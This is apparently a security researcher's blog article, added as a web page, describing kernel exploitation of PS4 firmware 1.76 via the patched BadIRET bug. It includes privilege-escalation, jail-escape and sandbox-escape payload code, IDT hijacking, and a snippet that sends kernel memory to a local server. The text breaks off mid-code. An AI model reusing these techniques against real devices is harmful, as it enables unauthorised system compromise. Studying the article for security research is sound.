@@ -1,0 +1,979 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+		<link rel="stylesheet" type="text/css" href="css/core.css" />
+		<title>Hacking the PS4, part 3 - Kernel exploitation</title>
+	</head>
+	
+	<body>
+		<div class="page">
+			<div class="container">
+				<div class="header">
+					<a href="skills.html" class="header-element">
+						Skills
+					</a>
+					
+					<a href="articles.html" class="header-element">
+						Articles
+					</a>
+					
+					<a href="index.html" class="header-element">
+						Home
+					</a>
+				</div>
+				
+				<h1>Hacking the PS4, part 3</h1>
+				<h2>Kernel exploitation</h2>
+				
+				<hr>
+				
+				<p>
+					<b>Note</b>: This article is part of a 3 part series:
+				</p>
+				
+				<ul>
+					<li><a href="ps4.html">Hacking the PS4, part 1 - Introduction to PS4's security, and userland ROP</a></li>
+					<li><a href="ps4-2.html">Hacking the PS4, part 2 - Userland code execution</a></li>
+					<li><b><a href="ps4-3.html">Hacking the PS4, part 3 - Kernel exploitation</a></b></li>
+				</ul>
+				
+				<br>
+				
+				<h2>Prefix</h2>
+				<p>
+					I've recently been getting a lot of unwanted attention from people pleading me to release a "CFW" or "Jailbreak" so that they can pirate video games on their PS4.
+				</p>
+								
+				<p>
+					I want to make very clear that I've primarily been doing this research as a learning exercise because I have a passion for InfoSec. This is partly the reason why I've tried to take a such an open approach; and I'm very grateful to hear whenever another aspiring security analyst tells me that they have found these articles helpful.
+				</p>
+				
+				<p>
+					But if this doesn't describe you, and you just want to install a "CFW" on your console, these articles won't interest you; don't bother reading any further.
+				</p>
+				
+				<br>
+				
+				<h2>Introduction</h2>
+				<p>
+					I've had kernel code execution on the PS4 for just over a week now, and would like to explain how it works, and everything that I've managed to use it for thus far.
+				</p>
+				
+				<blockquote class="twitter-tweet" lang="en"><p lang="en" dir="ltr">PS4 kernel exploit finally working! Thanks to everyone involved!</p>&mdash; CTurt (@CTurtE) <a href="https://twitter.com/CTurtE/status/673581693207502849">December 6, 2015</a></blockquote>
+				<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+				
+				<p>
+					Since the kernel vulnerability used has already been patched (somewhere in 2.xx), I have decided to explain the process of how it was exploited it in the hope that it will make for an interesting read and that it might be useful for any developers who have access to a compatible firmware.
+				</p>
+				
+				<p>
+					Whilst I must refrain from releasing the full source code of the exploit and some of the details which directly apply to the PS4 due to fear that it would be used for malicious purposes, I can explain how to exploit the bug on FreeBSD, and provide some hints about how it can be ported to PS4.
+				</p>
+				
+				<br>
+				
+				<h2>Code execution</h2>
+				<p>
+					Firstly, I need to reveal the technique used to gain code execution under the WebKit process.
+				</p>
+				
+				<p>
+					The JavaScript core of WebKit uses <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">JIT (Just-in-time compilation)</a>, a way of dynamically compiling JavaScript into native code for performance reasons (as opposed to interpreters like <a href="cinoop.html">my Game Boy emulator</a>). Obviously, to do this requires an area of memory which is both writable and executable.
+				</p>
+				
+				<p>
+					Sony handled this by creating 2 custom system calls: <code>sys_jitshm_create</code>, and <code>sys_jitshm_alias</code>. You can use these system calls directly, or the wrappers in <code>libkernel</code> (<code>sceKernelJitCreateSharedMemory</code> et al.). To identify exactly how these functions are used, you should load, dump, and reverse <code>libSceJitBridge.sprx</code>.
+				</p>
+				
+				<p>
+					The basic idea is that there is no way to directly map a RWX virtual page. Instead, we need to allocate memory and create an alias of this mapping. We map the first handle as RX, and the alias as RW. This will give us two separate virtual mappings which point to the same physical memory.
+				</p>
+				
+				<p>
+					Code can now be written to the RW mapping and executed from the RX mapping like so:
+				</p>
+				
+				<pre><code>unsigned char loop[] = { 0xeb, 0xfe };
+memcpy(writableAddress, loop, sizeof(loop));
+
+((void (*)())executableAddress)();</code></pre>
+				
+				<p>
+					The ROP chain to setup memory, copy WiFi-Loader, and execute it was too long to be done in a single stage, so I had to store the current stage in a cookie, and reload the page after each stage to start the next one:
+				</p>
+				
+				<pre><code>var codeExecutionStage = getCookie("codeExecutionStage");
+if(codeExecutionStage == "1") {
+	allocateSharedMemory();
+	document.getElementById("codeExecutionStage").innerHTML = "Stage: Mapping shared memory...";
+	setTimeout(function() { document.cookie = "codeExecutionStage=2"; location.reload(); }, 10);
+}
+else if(codeExecutionStage == "2") {
+	mapSharedMemory();
+	document.getElementById("codeExecutionStage").innerHTML = "Stage: Waiting for payload...";
+	setTimeout(function() { document.cookie = "codeExecutionStage=3"; location.reload(); }, 10);
+}
+else if(codeExecutionStage == "3") {
+	payload();
+	document.getElementById("codeExecutionStage").innerHTML = "Stage: Executing...";
+	setTimeout(function() { document.cookie = "codeExecutionStage=4"; location.reload(); }, 10);
+}
+else if(codeExecutionStage == "4") {
+	copy();
+	document.getElementById("codeExecutionStage").innerHTML = "Stage: Done!";
+	setTimeout(function() { document.cookie = "codeExecutionStage=0"; location.reload(); }, 10);
+}</code></pre>
+				
+				<p>
+					Since we're using the JIT system calls for their intended purpose, it's not really an exploit, just a neat trick.
+				</p>
+				
+				<p>
+					You may also be disappointed to hear that very few apps have access to JIT. Sony added their own privilege checks in the kernel; only processes which pass these checks are allowed to use JIT. Unless we find another way of getting code execution, this means that exploits in games and web-apps (like YouTube and Netflix) will be limited to ROP.
+				</p>
+				
+				<br>
+				
+				<h2><code>NULL</code> dereferences</h2>
+				<p>
+					One of the first things I explored was the possibility of exploiting <code>NULL</code> dereferences since, historically these are one of the more common types of vulnerabilities.
+				</p>
+				
+				<p>
+					The basic idea is that if a kernel memory allocation fails, <code>NULL</code> will be returned, but a vulnerable piece of kernel code would then go on to use this pointer anyway, without first checking that the allocation succeeded. This situation may also arise when a kernel pointer is initialised to <code>NULL</code> and utilised before being set to a valid address. In these cases, if we can map and write to <code>NULL</code> from userland, we would have complete control over a piece of memory which should normally only be accessible from the kernel.
+				</p>
+				
+				<p>
+					Unfortunately, trying to map a <code>NULL</code> page will fail, returning <code>EINVAL</code>:
+				</p>
+				
+				<pre><code>mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);</code></pre>
+				
+				<p>
+					This is due to the <code>sysctl</code> flag, <code>security.bsd.map_at_zero</code>, being set to 0; attempting to change it to 1 will also fail:
+				</p>
+				
+				<pre><code>int enableNULLmapping(void) {
+	int val = 1;
+	int len = sizeof(val);
+	
+	return sysctlbyname("security.bsd.map_at_zero", NULL, 0, &amp;val, &amp;len);
+}</code></pre>
+				
+				<p>
+					Since we have no way of controlling the memory at <code>NULL</code>, it would be unlikely that we can exploit any kernel <code>NULL</code> dereferences.
+				</p>
+				
+				<br>
+				
+				<h2>sysctl</h2>
+				<p>
+					The <code>libkernel</code> module contains a standard FreeBSD function called <a href="https://www.freebsd.org/cgi/man.cgi?query=sysctl&apropos=0&sektion=3&manpath=FreeBSD+9.0-RELEASE&arch=amd64&format=html"><code>sysctl</code></a>, which can be used to extract some system information.
+				</p>
+				
+				<p>
+					For example, it can be used to read the value of <code>KERN_OSTYPE</code>, which is <code>FreeBSD</code>:
+				</p>
+				
+				<pre><code>int getOS(char *destination) {
+	int name[2];
+	size_t len;
+	
+	name[0] = CTL_KERN;
+	name[1] = KERN_OSTYPE;
+	
+	return sysctl(name, 2, destination, &amp;len, NULL, 0);
+}</code></pre>
+				
+				<br>
+				
+				<h2>Reading kernel call stacks</h2>
+				<p>
+					By far, the most interesting thing that <code>sysctl</code> can be used for is reading kernel call stacks:
+				</p>
+				
+				<pre><code>size_t getKernelStacks(void *destination) {
+	int name[4];
+	size_t len;
+	
+	name[0] = CTL_KERN;
+	name[1] = KERN_PROC;
+	name[2] = KERN_PROC_KSTACK;
+	name[3] = syscall(20);
+	
+	sysctl(name, 4, destination, &amp;len, NULL, 0);
+	
+	return len;
+}</code></pre>
+				
+				<p>
+					This results in several stacks (one for each thread), like the following:
+				</p>
+				
+				<pre><code>#0 0xffffffff8243f6dc at mi_switch+0xbc
+#1 0xffffffff82473d7c at sleepq_wait_sig+0x13c
+#2 0xffffffff8247415f at sleepq_timedwait_sig+0xf
+#3 0xffffffff8243f2ba at _sleep+0x23a
+#4 0xffffffff8244ee35 at umtx_thread_exit+0x13b5
+#5 0xffffffff82616735 at amd64_syscall+0x4c5
+#6 0xffffffff825ff357 at Xfast_syscall+0xf7</code></pre>
+				
+				<p>
+					Not only does this give us an easy way to identify roughly how different some parts of the PS4 kernel are from FreeBSD, but it also leaks the addresses of some kernel functions which will be vital for exploitation later. Just in case you needed any more confirmation that there is no kernel ASLR, these function addresses are always the same across reboots.
+				</p>
+				
+				<br>
+				
+				<h2>Reading system call names</h2>
+				<p>
+					It is possible to identify unknown system calls by reading their kernel call stacks during execution. We can create a separate thread which performs an unknown system call repeatedly, wait for it to be preempted, and read its call stack: 
+				</p>
+				
+				<pre><code>void *threadFunction(void *arg) {
+	while(1) {
+		syscall(532, 0, 0, 0, 0, 0, 0);
+	}
+}
+
+...
+
+ScePthread thread;
+scePthreadCreate(&amp;thread, NULL, threadFunction, NULL, "test");
+
+size = getKernelStacks(buffer);
+
+sceNetSend(sock, buffer, size, 0);
+
+scePthreadCancel(thread);</code></pre>
+				
+				<p>
+					Here is the resultant kernel call stack of the new thread:
+				</p>
+				
+				<pre><code>#0 0xffffffff8243f6dc at mi_switch+0xbc
+#1 0xffffffff8243dcaf at critical_exit+0x6f
+#2 0xffffffff82609ca9 at ipi_bitmap_handler+0x159
+#3 0xffffffff825ffe47 at Xipi_intr_bitmap_handler+0x97
+#4 0xffffffff823723fa at uart_bus_detach+0x38a
+#5 0xffffffff82374f26 at uart_tty_detach+0xad6
+#6 0xffffffff823f1661 at cnputc+0x91
+#7 0xffffffff823f17a8 at cnputs+0x28
+#8 0xffffffff8246e44a at vprintf+0x9a
+#9 0xffffffff8246e38f at printf+0x4f
+#10 0xffffffff826a2ede at sys_regmgr_call+0x20e
+#11 0xffffffff82616735 at amd64_syscall+0x4c5
+#12 0xffffffff825ff357 at Xfast_syscall+0xf7</code></pre>
+				
+				<p>
+					This confirms that system call 532, <code>sys_regmgr_call</code>, executes a registry command, as predicted in <a href="ps4-2.html">my previous article</a>.
+				</p>
+				
+				<p>
+					Although it is technically possible for the kernel to be preempted during any piece of kernel code which doesn't follow a <code>critical_enter</code>, it can be difficult to achieve this in practice. This is especially true with system calls which consist of only a few instructions, resulting in a smaller race window, such as <code>getpid</code>:
+				</p>
+				
+				<pre><code>int sys_getpid(struct thread *td, struct getpid_args *uap) {
+	struct proc *p = td->td_proc;
+	
+	td->td_retval[0] = p->p_pid;
+	
+	return (0);
+}</code></pre>
+				
+				<pre><code>sys_getpid:
+	mov     rax, [rdi+8]
+	movsxd  rax, dword ptr [rax+0B0h]
+	mov     [rdi+368h], rax
+	xor     eax, eax
+	retn</code></pre>
+				
+				<br>
+				
+				<h2>BadIRET</h2>
+				<p>
+					<a href="http://seclists.org/oss-sec/2015/q3/66">BadIRET</a> is a kernel vulnerability originally discovered in Linux and later found to affect FreeBSD too.
+				</p>
+				
+				<p>
+					Despite <a href="https://reviews.freebsd.org/rS275833">being fixed back in 2014</a>, BadIRET has only recently gotten a <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-15:21.amd64.asc">security advisory</a>, apparently due to the security officer being replaced around this time. Because of this, I hadn't heard of BadIRET back when I started researching the PS4.
+				</p>
+				
+				<p>
+					Check out the blog posts by <a href="http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/">Rafal Wojtczuk</a> and <a href="http://blog.pi3.com.pl/?p=509">Adam Zabrocki</a> for detailed explanations of how BadIRET can be exploited on Linux; most of the concepts apply to FreeBSD too.
+				</p>
+				
+				<p>
+					I'm pleased to report that the PS4 kernel from firmware 1.76 <strong>is</strong> vulnerable to BadIRET!
+				</p>
+				
+				<br>
+				
+				<h3>Brief explanation</h3>
+				<p>
+					The <code>GS</code> register is used by userland processes to access per-thread state data, and by the kernel to access per-processor state data. 
+				</p>
+				
+				<p>
+					The kernel switches between the current kernel and userland <code>GS</code> bases using the <code>swapgs</code> instruction.
+				</p>
+				
+				<p>
+					When the kernel wishes to return execution from an interrupt back to userland, it uses the <code>iret</code> instruction. The problem is that if <code>iret</code> throws an <code>#SS</code> exception, one extra <code>swapgs</code> is performed, meaning that the <code>GS</code> register will switch to the userland <code>GS</code> base whilst the kernel still expects it to be the kernel <code>GS</code>.
+				</p>
+				
+				<p>
+					Since the userland <code>GS</code> base is fully controllable with <code>sysarch</code>:
+				</p>
+				
+				<pre><code>#define AMD64_SET_GSBASE 131
+
+int amd64_set_gsbase(void *base) {
+	return sysarch(AMD64_SET_GSBASE, &amp;base);
+}</code></pre>
+				
+				<p>
+					Any writes which the kernel performs relative to the <code>GS</code> base can be controlled.
+ 				</p>
+				
+				<p>
+					Interestingly, OpenBSD has a <code>sysctl</code> option called <code>machdep.userldt</code> which controls whether user processes should be allowed to modify <code>LDT</code>, and is disabled by default. If something like this would have been included in FreeBSD, we probably wouldn't have had permission to create <code>LDT</code> entries, and trigger the vulnerable <code>#SS</code> exception.
+				</p>
+				
+				<br>
+				
+				<h3>Debugging FreeBSD</h3>
+				<p>
+					Since the PS4 firmware is based on FreeBSD 9.0-RELEASE, the first thing to do is achieve kernel code execution from the bug on FreeBSD 9.0; it is essential to have a decent debugger setup for this. I won't go through this process in much detail since <a href="https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd.html#kernel-debugging">iZsh explains how to debug a FreeBSD virtual machine on OS X in his sysret exploit write-up</a>, and the stages are almost identical for Linux Mint.
+				</p>
+				
+				<p>
+					Just install the build system beforehand:
+				</p>
+
+				<pre><code>sudo apt-get install build-essential
+sudo apt-get install libncurses5-dev</code></pre>
+				
+				<p>
+					And install <code>gdb-amd64-marcel-freebsd</code> as explained.
+				</p>
+				
+				<p>
+					Note that you may need to set the appropriate architecture if you receive the "remote register badly formatted" error.
+				</p>
+
+				<pre><code>gdb-amd64-marcel-freebsd -q -tui kernel/kernel
+set architecture i386:x86-64
+target remote localhost:8864</code></pre>
+				
+				<p>
+					Another option is to use the remote gdb feature within IDA Pro.
+				</p>
+				
+				<p>
+					Finally, to transfer code to the virtual machine, you can setup a web server on the host and use the <code>fetch</code> command:
+				</p>
+				
+				<pre><code>fetch -o badiret.c http://192.168.0.4/badiret.c</code></pre>
+				
+				<br>
+				
+				<h3>Optimisation</h3>
+				<p>
+					Exploiting BadIRET relies on the specific configuration of a number of low-level x86 features. The exploit is sensitive to certain compiler optimisations which may generate code that is functionally equivalent to the unoptimised code, but have adverse effects when executed. When writing this kernel exploit, compiler optimisations were disabled to increase reliability and reproducibility across platforms. 
+				</p>
+				
+				<p>
+					For example, one problem I encountered when building the exploit with optimisations is the use of segment registers. With optimisations enabled, certain variables would be accessed relative to the <code>cs</code> segment register. However, by the time our kernel payload is executed, the <code>cs</code> register will have been changed by the kernel, meaning that these variables will be incorrectly addressed. 
+				</p>
+				
+				<br>
+				
+				<h3>The Interrupt Descriptor Table</h3>
+				<p>
+					The Interrupt Descriptor Table (IDT) is the data structure on x86 used to manage interrupts. Corrupting this structure wasn't a viable attack vector for BadIRET on Linux since it is read-only. However, on FreeBSD this is not the case.
+				</p>
+				
+				<p>
+					With the ability to write data to kernel memory, it is possible to corrupt an entry in this table and hijack an exception handler to obtain kernel code execution. Our target to hijack will be the page fault exception handler (<code>#PF</code>), called <code>Xpage</code>, which is fired when a <a href="https://en.wikipedia.org/wiki/Page_fault">page fault</a> occurs; its address on FreeBSD 9.0 is <code>0xFFFFFFFF80B03240</code>.
+				</p>
+				
+				<p>
+					We first need to use the unprivileged <code>sidt</code> (Store Interrupt Descriptor Table) instruction from userland to retrieve the Interrupt Descriptor Table Register, which is described as the following 6 byte structure:
+				</p>
+				
+				<pre><code>struct idtr {
+	uint16_t limit;
+	uint64_t base;
+} __attribute__((packed));</code></pre>
+				
+				<p>
+					With the IDT base, we can calculate the address of the function pointer to the page fault handler (<code>#PF</code> is entry 14 in the IDT):
+				</p>
+				
+				<pre><code>struct idt_descriptor *sidt(void) {
+    struct region_descriptor idt;
+    asm volatile("sidt %0" : "=m"(idt));
+    return (struct idt_descriptor *)idt.rd_base;
+}
+
+xpageEntryHi = &(sidt()[IDT_PF]).off_high;</code></pre>
+				
+				<br>
+				
+				<h3>Abusing <code>critical_enter</code> to corrupt kernel pointers</h3>
+				<p>
+					Now that we've obtained this address, we need to identify a suitable means of controlling it.
+				</p>
+				
+				<p>
+					Our technique will abuse <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_switch.c#L181"><code>critical_enter</code></a>, a routine which increments <code>td->td_critnest</code> to keep count of the number of critical sections the kernel thread is currently in (this count is decremented at <code>critical_exit</code>). The <code>td_critnest</code> value is accessed relative to an address stored in <code>GS</code> (known as <code>td</code>): 
+				</p>
+				
+				<pre><code>critical_enter:
+	mov rax, gs:0         ; rax = *gs (td)
+	inc dword [rax+0x3cc] ; td->td_critnest++;
+	ret</code></pre>
+				
+				<p>
+					Since kernel memory is based at <code>0xffffffff80000000</code> in the virtual address space, kernel function pointers have an upper four bytes of <code>0xffffffff</code>. If <code>(*gs)+0x3cc</code> points to the upper four bytes of a kernel pointer, the value will overflow from <code>0xffffffff</code> to <code>0x00000000</code>, effectively corrupting it into a userland pointer.
+				</p>
+				
+				<p>
+					In our case, this should point to the upper 4 bytes of the page fault entry in the IDT, minus the <code>0x3cc</code> offset:
+				</p>
+				
+				<pre><code>gsBase[0] = xpageEntryHi - 0x3cc;</code></pre>
+				
+				<p>
+					This is how the <code>critical_enter</code> write will affect the <code>#PF</code> entry in the IDT (bytes in bold are used by the address):
+				</p>
+				
+				<code>00 8E <b>B0 80</b> &nbsp;&nbsp;<b>FF FF FF FF</b>&nbsp;&nbsp; &nbsp; 00 00 00 00 <b>40 32</b> 20 00 - Address: 0xFFFFFFFF80B03240<br>
+00 8E <b>B0 80</b> &nbsp;<b>(FF FF FF FF)+1</b>&nbsp;  00 00 00 00 <b>40 32</b> 20 00 - Address: 0x(FFFFFFFF+1)80B03240<br>
+00 8E <b>B0 80</b> &nbsp;&nbsp;<b>00 00 00 00</b>&nbsp;&nbsp; &nbsp; 00 00 00 00 <b>40 32</b> 20 00 - Address: 0x0000000080B03240<br><br></code>
+				
+				<p>
+					Since the PS4 CPU doesn't support SMAP (Supervisor Mode Access Prevention) or SMEP (Supervisor Mode Execution Prevention), the CPU will happily execute userland memory in kernel mode, as long as it is marked as executable. So to achieve kernel code execution, we just need to map and write our payload to <code>0x80B03240</code>, and trigger a page fault.
+				</p>
+				
+				<br>
+				
+				<h3>Triggering a page fault</h3>
+				<p>After triggering the bug, the kernel will eventually reach this instruction in <code>_thread_lock_flags</code>:
+				</p>
+				
+				<pre><code>FFFFFFFF80823368: mov rax, [r12+18h]</code></pre>
+				
+				<p>
+					Since <code>r12</code> contains <code>0</code>, a read from the unmapped address <code>0x18</code> will be performed, resulting in a jump to the page fault handler (which now points to our userland address).
+				</p>
+				
+				<p>
+					At this point, we are executing arbitrary code in the kernel. However, we are already two faults deep:
+				</p>
+				
+				<pre><code>#SS exception -> Corrupt #PF handler -> #PF exception -> Our payload</code></pre>
+				
+				<p>
+					In x86 <a href="https://en.wikipedia.org/wiki/Triple_fault">a triple fault</a> will cause a reboot. We need to take precautions to prevent any further faults from occurring and crashing the system. Mainly, we need to ensure that any user memory we access in the payload is already pre-faulted (and will not cause a page fault). We achieve this by simply performing a read to these memory locations before performing the exploit: 
+				</p>
+				
+				<pre><code>void prefault(void *address, size_t size) {
+	int i;
+	for(i = 0; i < size; i++) {
+		volatile uint8_t c;
+		(void)c;
+		
+		c = ((char *)address)[i];
+	}
+}</code></pre>
+				
+				<p>
+					In general, it's best to keep the payload code to the bare minimum before returning to userland.
+				</p>
+				
+				<br>
+				
+				<h3>Privilege escalation</h3>
+				<p>
+					The standard payload for a kernel exploit is to give the current process root privileges:
+				</p>
+				
+				<pre><code>struct thread *td;
+struct ucred *cred;
+
+// Get td pointer
+asm volatile("mov %0, %%gs:0" : "=r"(td));
+
+// Resolve creds
+cred = td->td_proc->p_ucred;
+
+// Escalate process to root
+cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
+cred->cr_groups[0] = 0;</code></pre>
+				
+				<p>
+					On the PS4, our process is also in a <a href="https://www.freebsd.org/doc/handbook/jails.html">FreeBSD jail</a>, so we'll also need to perform a <i>jailbreak</i>:
+				</p>
+				
+				<pre><code>cred->cr_prison = &prison0;</code></pre>
+				
+				<p>
+					This causes the <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_jail.c#L3390"><code>jailed</code></a> check to return 0.
+				</p>
+				
+				<p>
+					We'll also need to break out of the sandbox to gain full access to the filesystem:
+				</p>
+				
+				<pre><code>void *td_fdp = *(void **)(((char *)td_proc) + 72);
+uint64_t *td_fdp_fd_rdir = (uint64_t*)(((char *)td_fdp) + 24);
+uint64_t *td_fdp_fd_jdir = (uint64_t*)(((char *)td_fdp) + 32);
+uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
+*td_fdp_fd_rdir = *rootvnode;
+*td_fdp_fd_jdir = *rootvnode;</code></pre>
+				
+				<p>
+					There are also a few other checks which should be bypassed on the PS4. Once you've dumped the kernel, these checks are trivial to bypass, just search for <code>sceSblACMgr</code>.
+				</p>
+				
+				<br>
+				
+				<h3>Restoring kernel state</h3>
+				<p>
+					With GS memory carefully prepared to perform the <code>td->td_critnest++</code> write at a controlled address, we need to perform cleanup of the corruption, as well any other writes performed along the way (at an offset from <code>td</code>). 
+				</p>
+				
+				<p>
+					Obviously, the first thing to restore will be the page fault entry in the IDT which we hijacked. We can write to it directly since we are now executing in kernel mode:
+				</p>
+				
+				<pre><code>*((int *)XpageEntryHi) = 0xffffffff;</code></pre>
+				
+				<p>
+					We can verify that the page fault entry is correctly restored by triggering a page fault and seeing where the debugger jumps:
+				</p>
+				
+				<pre><code>char *p = NULL;
+*p = 0;</code></pre>
+				
+				<p>
+					If we dump the nearby memory before and after triggering the exploit (<code>(gdb) x /512bx  0xffffffff81183c7c</code>), we will find that a few other bytes were corrupted too. For example:
+				</p>
+								
+				<pre><code>0xffffffff81184048 before: 0xff 0xff 0xff 0xff 0x00 0x00 0x00 0x00
+0xffffffff81184048 after:  0xff 0xff 0xff 0xff 0x01 0x00 0x00 0x00</code></pre>
+				
+				<p>
+					Simply write back the all values which were changed, and the system should be ready to continue execution gracefully.
+				</p>
+				
+				<p>
+					Now, the final step is a matter of crafting a valid <code>iret</code> stack frame and returning to userland via the <code>iret</code> instruction.
+				</p>
+				
+				<p>
+					In userland, to prevent the next interrupt from triggering the vulnerable <code>#SS</code> exception again, set the <code>sd_p</code> member of the LDT descriptor back to 1 so that it is marked present, and update it with <code>i386_set_ldt</code>.
+				</p>
+				
+				<br>
+				
+				<h3>Improving reliability</h3>
+				<p>
+					In its current state, the exploit will work most of the time. However, occasionally multiple nested calls to <code>critical_enter</code> will occur before jumping to the <code>#PF</code> handler.
+				</p>
+				
+				<p>
+					In this situation, the upper 4 bytes of the <code>#PF</code> function pointer in the IDT would be <code>0x00000001</code> or <code>0x00000002</code> rather than <code>0x00000000</code>. To ensure that our payload is always executed, just map and copy the trampoline code to all of these locations.
+				</p>
+				
+				<br>
+				
+				<h2>Porting to PS4</h2>
+				<p>
+					Now that we've successfully exploited the bug on FreeBSD 9.0, let's identify every assumption that our exploit relies on for kernel code execution:
+				</p>
+				
+				<ul>
+					<li>#PF being the 14th entry in the IDT,</li>
+					<li><code>Xpage</code> address being <code>0xFFFFFFFF80B03240</code>,</li>
+					<li>The <code>td</code> pointer being accessed from <code>gs:0</code>,</li>
+					<li>The offset of <code>td_critnest</code> in <code>struct thread</code> being <code>0x3cc</code>,</li>
+				</ul>
+				
+				<br>
+				
+				<h3>#PF index in IDT</h3>
+				<p>
+					Since page fault is defined as hardware exception 14 in the x86 architecture, it is safe to assume that this is unchanged in the PS4.
+				</p>
+				
+				<br>
+				
+				<h3><code>Xpage</code> address</h3>
+				<p>
+					I wasn't able to leak the address of <code>Xpage</code> directly, but we know the address of <code>Xfast_syscall</code> to be <code>0xFFFFFFFF825FF260</code> from <code>sysctl</code> extracted kernel call stacks, and on FreeBSD these functions happen to be very close:
+				</p>
+				
+				<pre><code>FreeBSD Xpage: 0xFFFFFFFF80B03240
+FreeBSD Xfast_syscall: 0xFFFFFFFF80B03330
+Difference: 0xf0</code></pre>
+				
+				<p>
+					Subtracting <code>0xf0</code> from the address of <code>Xfast_syscall</code> gives us <code>0xFFFFFFFF825FF170</code>, which should either be perfect, or an accurate enough estimate. Knowing the exact address of <code>Xpage</code> is not necessary. By mapping a large NOP slide in userland, we only need to guess the general range the function is in.
+				</p>
+				
+				<br>
+				
+				<h3><code>td</code> offset from <code>gs</code></h3>
+				<p>
+					There is a high probability that Sony changed some internal system structs. Since the <code>gs</code> register is generally used as scratch space, we should make no hard assumptions about <code>td</code> being stored at <code>gs:0</code>. This isn't too big of a problem since we can spray the crafted <code>td</code> address across multiple offsets in <code>gs</code> memory and be fairly sure that the PS4 will use one of them as <code>td</code>.
+				</p>
+				
+				<br>
+				
+				<h3><code>td_critnest</code> offset</h3>
+				<p>
+					The only other unknown fixed offset that we rely on is <code>critical_enter</code> incrementing <code>td+0x3cc</code>. This was not the case on the PS4, and finding the actual offset was the most time consuming to find. 
+				</p>
+				
+				<p>
+					We experimented with various different ways of trying to deduce this offset.  One idea was to point <code>td</code> into a large empty mapping in userland and watch for writes to memory. By starting a second thread that scanned the mapping in a tight loop, it was possible to identify at which offsets writes occurred, and send this information over the network before the entire system crashed. This race window was large enough to work when tested in a FreeBSD VM:
+				</p>
+
+				<pre><code>[+] Allocated LDT index: 16
+Leak thread started
+[+] Dry run (set SS to 0x87)...
+[+] Here goes...
+Found non-zero memory at offset 3cc
+Found non-zero memory at offset 3d0
+Found non-zero memory at offset 3d8
+Found non-zero memory at offset 3cc
+Found non-zero memory at offset 3d0
+Found non-zero memory at offset 3d8</code></pre>
+
+				<p>
+                    However, we had less luck running this same code on the PS4.  We could only guess that the system crashed more quickly, and the kernel didn't have enough time to send these packets.
+				</p>
+				
+				<p>
+					Since this was the only unknown value we depended on, in the end it proved easier to just brute force it. We know that it must be aligned to 4 bytes, and that it's likely to be within the range of <code>0x3b0 - 0x400</code>, which gives us only about 20 possibilities to try (in reality, I tried a much larger range than this just in case).
+				</p>
+				
+				<p>
+					Brute forcing this offset was extremely tedious since I could only try one at a time, and the PS4 needed to reboot into safe mode after each time it had run a test and panicked (takes just under 2 minutes); every time I fixed something in the code I had to go through all these offsets again. Additionally, since the exploit isn't quite 100% reliable, I mistakenly tried and disregarded the correct offset several times without realising.
+				</p>
+				
+				<p>
+					It was a massive endurance, but I eventually found the correct <code>td->td_critnest</code> offset.
+				</p>
+				
+				<br>
+				
+				<h3>Other PS4 quirks</h3>
+				<p>
+					Aside from the fixed offsets and addresses, there are a few other things we need to account for when porting the code to PS4. Since we can't perform <code>PROT_EXEC</code> mappings directly, we need to to use the JIT technique described earlier when mapping the payload.
+				
+				<p>
+					Fixed mappings must be aligned to <code>PAGE_SIZE</code>, which is 4KB by default on FreeBSD, but 16KB for PS4.
+				</p>
+				
+				<br>
+				
+				<h2>Dumping the kernel</h2>
+				<p>
+					Since restoring the kernel to a stable state relies on cleaning up many different addresses in the IDT, I decided that it would be a good idea to first verify that the payload was successfully being executed by dumping kernel memory over a socket.
+				</p>
+				
+				<p>
+					Using <code>sysctl</code>, I was able to extract the addresses of the <code>send</code> related functions:
+				</p>
+				
+				<pre><code>#0 0xffffffff8243f6dc at mi_switch+0xbc
+#1 0xffffffff82473d7c at sleepq_wait_sig+0x13c
+#2 0xffffffff82473c4b at sleepq_wait_sig+0xb
+#3 0xffffffff8243f2da at _sleep+0x25a
+#4 0xffffffff82493f07 at sbwait+0xd7
+#5 0xffffffff82497181 at sosend_generic+0x291
+#6 0xffffffff8249ea70 at kern_sendit+0x170
+#7 0xffffffff8249ed8f at sys_sendto+0x17f
+#8 0xffffffff8249ec69 at sys_sendto+0x59
+#9 0xffffffff82616735 at amd64_syscall+0x4c5
+#10 0xffffffff825ff357 at Xfast_syscall+0xf7</code></pre>
+				
+				<p>
+					We can use <code>sys_sendto</code> directly from the kernel without needing to restore the system to a fully stable state.
+				</p>
+				
+				<pre><code>// From userland:
+// Open a socket and connect it to our dump server
+struct sockaddr_in server;
+
+server.sin_len = sizeof(server);
+server.sin_family = AF_INET;
+server.sin_addr.s_addr = IP(192, 168, 0, 4);
+server.sin_port = sceNetHtons(9023);
+memset(server.sin_zero, 0, sizeof(server.sin_zero));
+
+int sock = sceNetSocket("dumper", AF_INET, SOCK_STREAM, 0);
+sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
+
+// Disable packet queuing
+int flag = 1;
+sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
+
+// Allocate and prefault over dump memory
+dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+prefault(dump, PAGE_SIZE);
+
+
+// From kernel:
+struct thread *td;
+
+// Switch back to kernel GS base
+asm volatile("swapgs");
+
+// Get td address
+asm volatile("mov %0, gs:0" : "=r"(td));
+ 
+// Copy some kernel memory into userland memory
+memcpy(dump, (void *)0xffffffff8249ec10, 0x1000);
+
+int (*sys_sendto)(ScePthread td, struct sendto_args *uap) = (void *)0xffffffff8249ec10;
